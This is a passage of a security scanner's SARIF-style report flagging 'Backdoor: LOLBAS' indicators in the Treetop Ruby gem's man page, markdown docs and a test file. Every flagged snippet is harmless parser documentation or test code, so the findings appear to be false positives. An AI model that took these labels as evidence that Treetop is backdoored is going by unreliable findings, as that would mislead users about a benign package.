                    "text": ".\\\" THE SOFTWARE.\n.TH tt 1 2013-06-19 Treetop \"Treetop v1.4.14\"\n.SH NAME\ntt \\- Compile a treetop grammar file to ruby source code\n.SH SYNOPSIS\n.B tt\n.RI [ options \"] \" grammar_file \"[.treetop|.tt] ...\"\n",
                    "rendered": {
                      "text": ".\\\" THE SOFTWARE.\n.TH tt 1 2013-06-19 Treetop \"Treetop v1.4.14\"\n.SH NAME\ntt \\- Compile a treetop grammar file to ruby source code\n.SH SYNOPSIS\n.B tt\n.RI [ options \"] \" grammar_file \"[.treetop|.tt] ...\"\n",
                      "markdown": "`.\\\" THE SOFTWARE.\n.TH tt 1 2013-06-19 Treetop \"Treetop v1.4.14\"\n.SH NAME\ntt \\- Compile a treetop grammar file to ruby source code\n.SH SYNOPSIS\n.B tt\n.RI [ options \"] \" grammar_file \"[.treetop|.tt] ...\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/tt.1"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 40,
                  "endLine": 1,
                  "endColumn": 46,
                  "snippet": {
                    "text": ".\\\" treetop - Bringing the simplicity of Ruby to syntactic analysis\n.\\\"\n.\\\" Copyright (c) 2007 Nathan Sobo.\n.\\\"\n",
                    "rendered": {
                      "text": ".\\\" treetop - Bringing the simplicity of Ruby to syntactic analysis\n.\\\"\n.\\\" Copyright (c) 2007 Nathan Sobo.\n.\\\"\n",
                      "markdown": "`.\\\" treetop - Bringing the simplicity of Ruby to syntactic analysis\n.\\\"\n.\\\" Copyright (c) 2007 Nathan Sobo.\n.\\\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 5,
                  "endLine": 214,
                  "endColumn": 9,
                  "snippet": {
                    "text": "then continue by trying to match `baz`.\n\nTreetop, like other PEG parsers, achieves its performance guarantee by remembering which rules it has\ntried at which locations in the input, and what the result was. This process, called memoization,\nrequires that the rule would produce the same result (if run again) as it produced the first time when\nthe result was remembered. If you violate this principle in your semantic predicates, be prepared to\nfight Cerberus before you're allowed out of Hades again.\n",
                    "rendered": {
                      "text": "then continue by trying to match `baz`.\n\nTreetop, like other PEG parsers, achieves its performance guarantee by remembering which rules it has\ntried at which locations in the input, and what the result was. This process, called memoization,\nrequires that the rule would produce the same result (if run again) as it produced the first time when\nthe result was remembered. If you violate this principle in your semantic predicates, be prepared to\nfight Cerberus before you're allowed out of Hades again.\n",
                      "markdown": "`then continue by trying to match `baz`.\n\nTreetop, like other PEG parsers, achieves its performance guarantee by remembering which rules it has\ntried at which locations in the input, and what the result was. This process, called memoization,\nrequires that the rule would produce the same result (if run again) as it produced the first time when\nthe result was remembered. If you violate this principle in your semantic predicates, be prepared to\nfight Cerberus before you're allowed out of Hades again.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 23,
                  "endLine": 61,
                  "endColumn": 27,
                  "snippet": {
                    "text": "The anything symbol is represented by a dot (`.`) and matches any single character.\n\n###Ellipsis\nAn empty string matches at any position and consumes no input. It's useful when you wish to treat a single symbol as part of a sequence, for example when an alternate rule will be processed using shared code.\n\n<pre>\n    rule alts\n",
                    "rendered": {
                      "text": "The anything symbol is represented by a dot (`.`) and matches any single character.\n\n###Ellipsis\nAn empty string matches at any position and consumes no input. It's useful when you wish to treat a single symbol as part of a sequence, for example when an alternate rule will be processed using shared code.\n\n<pre>\n    rule alts\n",
                      "markdown": "`The anything symbol is represented by a dot (`.`) and matches any single character.\n\n###Ellipsis\nAn empty string matches at any position and consumes no input. It's useful when you wish to treat a single symbol as part of a sequence, for example when an alternate rule will be processed using shared code.\n\n<pre>\n    rule alts\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 25,
                  "endLine": 31,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n* `rule` : This defines a parsing rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\n",
                    "rendered": {
                      "text": "\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n* `rule` : This defines a parsing rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\n",
                      "markdown": "`\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n* `rule` : This defines a parsing rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 92,
                  "endLine": 215,
                  "endColumn": 98,
                  "snippet": {
                    "text": "\nTreetop, like other PEG parsers, achieves its performance guarantee by remembering which rules it has\ntried at which locations in the input, and what the result was. This process, called memoization,\nrequires that the rule would produce the same result (if run again) as it produced the first time when\nthe result was remembered. If you violate this principle in your semantic predicates, be prepared to\nfight Cerberus before you're allowed out of Hades again.\n\n",
                    "rendered": {
                      "text": "\nTreetop, like other PEG parsers, achieves its performance guarantee by remembering which rules it has\ntried at which locations in the input, and what the result was. This process, called memoization,\nrequires that the rule would produce the same result (if run again) as it produced the first time when\nthe result was remembered. If you violate this principle in your semantic predicates, be prepared to\nfight Cerberus before you're allowed out of Hades again.\n\n",
                      "markdown": "`\nTreetop, like other PEG parsers, achieves its performance guarantee by remembering which rules it has\ntried at which locations in the input, and what the result was. This process, called memoization,\nrequires that the rule would produce the same result (if run again) as it produced the first time when\nthe result was remembered. If you violate this principle in your semantic predicates, be prepared to\nfight Cerberus before you're allowed out of Hades again.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 85,
                  "endLine": 186,
                  "endColumn": 91,
                  "snippet": {
                    "text": "* `!{ ... }` Evaluate the block and fail this rule if the result is not false or nil\n\nThe lambda is passed a single argument which is the array of syntax nodes matched so far in the\ncurrent sequence. Note that because the current rule has not yet succeeded, no syntax node has\nyet been constructed, and so the lambda block is being run in a context where the `names` of the\npreceding rules (or as assigned by labels) are not available to access the sub-rules.\n\n",
                    "rendered": {
                      "text": "* `!{ ... }` Evaluate the block and fail this rule if the result is not false or nil\n\nThe lambda is passed a single argument which is the array of syntax nodes matched so far in the\ncurrent sequence. Note that because the current rule has not yet succeeded, no syntax node has\nyet been constructed, and so the lambda block is being run in a context where the `names` of the\npreceding rules (or as assigned by labels) are not available to access the sub-rules.\n\n",
                      "markdown": "`* `!{ ... }` Evaluate the block and fail this rule if the result is not false or nil\n\nThe lambda is passed a single argument which is the array of syntax nodes matched so far in the\ncurrent sequence. Note that because the current rule has not yet succeeded, no syntax node has\nyet been constructed, and so the lambda block is being run in a context where the `names` of the\npreceding rules (or as assigned by labels) are not available to access the sub-rules.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 31,
                  "endLine": 179,
                  "endColumn": 37,
                  "snippet": {
                    "text": "way a Treetop parser backtracks in a way that breaks the parsing algorithm. See the\nnotes below on how to use this feature safely.\n\nThe code block is the body of a Ruby lambda block, and should return true or false, to cause this\nparse rule to continue or fail (for positive sempreds), fail or continue (for negative sempreds).\n\n* `&{ ... }` Evaluate the block and fail this rule if the result is false or nil\n",
                    "rendered": {
                      "text": "way a Treetop parser backtracks in a way that breaks the parsing algorithm. See the\nnotes below on how to use this feature safely.\n\nThe code block is the body of a Ruby lambda block, and should return true or false, to cause this\nparse rule to continue or fail (for positive sempreds), fail or continue (for negative sempreds).\n\n* `&{ ... }` Evaluate the block and fail this rule if the result is false or nil\n",
                      "markdown": "`way a Treetop parser backtracks in a way that breaks the parsing algorithm. See the\nnotes below on how to use this feature safely.\n\nThe code block is the body of a Ruby lambda block, and should return true or false, to cause this\nparse rule to continue or fail (for positive sempreds), fail or continue (for negative sempreds).\n\n* `&{ ... }` Evaluate the block and fail this rule if the result is false or nil\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 174,
                  "startColumn": 26,
                  "endLine": 174,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    end\n\n##Semantic predicates (positive and negative)\nSometimes you must execute Ruby code during parsing in order to decide how to proceed.\nThis is an advanced feature, and must be used with great care, because it can change the\nway a Treetop parser backtracks in a way that breaks the parsing algorithm. See the\nnotes below on how to use this feature safely.\n",
                    "rendered": {
                      "text": "    end\n\n##Semantic predicates (positive and negative)\nSometimes you must execute Ruby code during parsing in order to decide how to proceed.\nThis is an advanced feature, and must be used with great care, because it can change the\nway a Treetop parser backtracks in a way that breaks the parsing algorithm. See the\nnotes below on how to use this feature safely.\n",
                      "markdown": "`    end\n\n##Semantic predicates (positive and negative)\nSometimes you must execute Ruby code during parsing in order to decide how to proceed.\nThis is an advanced feature, and must be used with great care, because it can change the\nway a Treetop parser backtracks in a way that breaks the parsing algorithm. See the\nnotes below on how to use this feature safely.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 83,
                  "endLine": 61,
                  "endColumn": 89,
                  "snippet": {
                    "text": "The anything symbol is represented by a dot (`.`) and matches any single character.\n\n###Ellipsis\nAn empty string matches at any position and consumes no input. It's useful when you wish to treat a single symbol as part of a sequence, for example when an alternate rule will be processed using shared code.\n\n<pre>\n    rule alts\n",
                    "rendered": {
                      "text": "The anything symbol is represented by a dot (`.`) and matches any single character.\n\n###Ellipsis\nAn empty string matches at any position and consumes no input. It's useful when you wish to treat a single symbol as part of a sequence, for example when an alternate rule will be processed using shared code.\n\n<pre>\n    rule alts\n",
                      "markdown": "`The anything symbol is represented by a dot (`.`) and matches any single character.\n\n###Ellipsis\nAn empty string matches at any position and consumes no input. It's useful when you wish to treat a single symbol as part of a sequence, for example when an alternate rule will be processed using shared code.\n\n<pre>\n    rule alts\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 129,
                  "endLine": 42,
                  "endColumn": 134,
                  "snippet": {
                    "text": "#Parsing Expressions\nEach rule associates a name with a _parsing expression_. Parsing expressions are a generalization of vanilla regular expressions. Their key feature is the ability to reference other expressions in the grammar by name.\n\nTreetop parsers will try to match the first rule defined in the grammar, unless you pass an optional parameter to set a different top rule.\n\n##Terminal Symbols\n###Strings\n",
                    "rendered": {
                      "text": "#Parsing Expressions\nEach rule associates a name with a _parsing expression_. Parsing expressions are a generalization of vanilla regular expressions. Their key feature is the ability to reference other expressions in the grammar by name.\n\nTreetop parsers will try to match the first rule defined in the grammar, unless you pass an optional parameter to set a different top rule.\n\n##Terminal Symbols\n###Strings\n",
                      "markdown": "`#Parsing Expressions\nEach rule associates a name with a _parsing expression_. Parsing expressions are a generalization of vanilla regular expressions. Their key feature is the ability to reference other expressions in the grammar by name.\n\nTreetop parsers will try to match the first rule defined in the grammar, unless you pass an optional parameter to set a different top rule.\n\n##Terminal Symbols\n###Strings\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 126,
                  "endLine": 35,
                  "endColumn": 132,
                  "snippet": {
                    "text": "ng rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\nA grammar may be surrounded by one or more nested `module` or `class` statements, which provides a namespace for the generated Ruby parser. Note that you cannot specify a superclass for a class, so if your class has a superclass, it must be declared elsewhere and loaded first.\n\nTreetop will emit a module called `GrammarName` and a parser class called `GrammarNameParser` (in the namespace, if specified).\n\n#Parsing Expressions\nEac",
                    "rendered": {
                      "text": "ng rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\nA grammar may be surrounded by one or more nested `module` or `class` statements, which provides a namespace for the generated Ruby parser. Note that you cannot specify a superclass for a class, so if your class has a superclass, it must be declared elsewhere and loaded first.\n\nTreetop will emit a module called `GrammarName` and a parser class called `GrammarNameParser` (in the namespace, if specified).\n\n#Parsing Expressions\nEac",
                      "markdown": "`ng rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\nA grammar may be surrounded by one or more nested `module` or `class` statements, which provides a namespace for the generated Ruby parser. Note that you cannot specify a superclass for a class, so if your class has a superclass, it must be declared elsewhere and loaded first.\n\nTreetop will emit a module called `GrammarName` and a parser class called `GrammarNameParser` (in the namespace, if specified).\n\n#Parsing Expressions\nEac`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 88,
                  "endLine": 31,
                  "endColumn": 94,
                  "snippet": {
                    "text": "\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n* `rule` : This defines a parsing rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\n",
                    "rendered": {
                      "text": "\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n* `rule` : This defines a parsing rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\n",
                      "markdown": "`\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n* `rule` : This defines a parsing rule within the grammar. It is followed by a name by which this rule can be referenced within other rules. It is then followed by a parsing expression defining the rule.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/syntactic_recognition.markdown"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 71,
                  "endLine": 29,
                  "endColumn": 77,
                  "snippet": {
                    "text": "\n* `grammar` : This introduces a new grammar. It is followed by a constant name to which the grammar will be bound when it is loaded.\n\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n",
                    "rendered": {
                      "text": "\n* `grammar` : This introduces a new grammar. It is followed by a constant name to which the grammar will be bound when it is loaded.\n\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n",
                      "markdown": "`\n* `grammar` : This introduces a new grammar. It is followed by a constant name to which the grammar will be bound when it is loaded.\n\n* `include`: This causes the generated parser to include the referenced Ruby module (which may be another parser)\n\n* `require`: This must be at the start of the file, and is passed through to the emitted Ruby grammar\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus_test.rb"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 3,
                  "endLine": 27,
                  "endColumn": 8,
                  "snippet": {
                    "text": "  \n  def test_variable_binding\n    variable = parse('x').eval\n    env = variable.bind(1, {})\n    assert_equal 1, env['x']\n  end\n  \n",
                    "rendered": {
                      "text": "  \n  def test_variable_binding\n    variable = parse('x').eval\n    env = variable.bind(1, {})\n    assert_equal 1, env['x']\n  end\n  \n",
                      "markdown": "`  \n  def test_variable_binding\n    variable = parse('x').eval\n    env = variable.bind(1, {})\n    assert_equal 1, env['x']\n  end\n  \n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 24,
                  "endLine": 73,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    end\n\n    =>\n    Expected one of (, - at line 1, column 3 (byte 3) after +\n    1\n    3\n\n",
                    "rendered": {
                      "text": "    end\n\n    =>\n    Expected one of (, - at line 1, column 3 (byte 3) after +\n    1\n    3\n\n",
                      "markdown": "`    end\n\n    =>\n    Expected one of (, - at line 1, column 3 (byte 3) after +\n    1\n    3\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 63,
                  "endLine": 61,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n##Learning From Failure\nIf a parse fails, it returns nil. In this case, you can ask the parser for an explanation.\nThe failure reasons include the terminal nodes which were tried at the furthermost point the parse reached.\n\n    parser = ArithmeticParser.new\n    result = parser.parse('4+=3')\n",
                    "rendered": {
                      "text": "\n##Learning From Failure\nIf a parse fails, it returns nil. In this case, you can ask the parser for an explanation.\nThe failure reasons include the terminal nodes which were tried at the furthermost point the parse reached.\n\n    parser = ArithmeticParser.new\n    result = parser.parse('4+=3')\n",
                      "markdown": "`\n##Learning From Failure\nIf a parse fails, it returns nil. In this case, you can ask the parser for an explanation.\nThe failure reasons include the terminal nodes which were tried at the furthermost point the parse reached.\n\n    parser = ArithmeticParser.new\n    result = parser.parse('4+=3')\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 92,
                  "endLine": 55,
                  "endColumn": 96,
                  "snippet": {
                    "text": "    parser.parse(input, :root => :variable)\n    parser.root = :variable\t# Permanent setting\n\nIf you have a statement-oriented language, you can save memory by parsing just one statement at a time,\nand discarding the parse tree after each statement.\n\n\n",
                    "rendered": {
                      "text": "    parser.parse(input, :root => :variable)\n    parser.root = :variable\t# Permanent setting\n\nIf you have a statement-oriented language, you can save memory by parsing just one statement at a time,\nand discarding the parse tree after each statement.\n\n\n",
                      "markdown": "`    parser.parse(input, :root => :variable)\n    parser.root = :variable\t# Permanent setting\n\nIf you have a statement-oriented language, you can save memory by parsing just one statement at a time,\nand discarding the parse tree after each statement.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 58,
                  "endLine": 19,
                  "endColumn": 64,
                  "snippet": {
                    "text": "in order to use Polyglot auto loading with Treetop in Ruby.\n\n##Instantiating and Using Parsers\nIf a grammar by the name of `Foo` is defined, the compiled Ruby source will define a `FooParser` class.\nTo parse input, create an instance and call its `parse` method with a string.\nThe parser will return the syntax tree of the match or `nil` if there is a failure.\nNote that by default, the parser will fail unless *all* input is consumed.\n",
                    "rendered": {
                      "text": "in order to use Polyglot auto loading with Treetop in Ruby.\n\n##Instantiating and Using Parsers\nIf a grammar by the name of `Foo` is defined, the compiled Ruby source will define a `FooParser` class.\nTo parse input, create an instance and call its `parse` method with a string.\nThe parser will return the syntax tree of the match or `nil` if there is a failure.\nNote that by default, the parser will fail unless *all* input is consumed.\n",
                      "markdown": "`in order to use Polyglot auto loading with Treetop in Ruby.\n\n##Instantiating and Using Parsers\nIf a grammar by the name of `Foo` is defined, the compiled Ruby source will define a `FooParser` class.\nTo parse input, create an instance and call its `parse` method with a string.\nThe parser will return the syntax tree of the match or `nil` if there is a failure.\nNote that by default, the parser will fail unless *all* input is consumed.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/using_in_ruby.markdown"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 198,
                  "endLine": 9,
                  "endColumn": 204,
                  "snippet": {
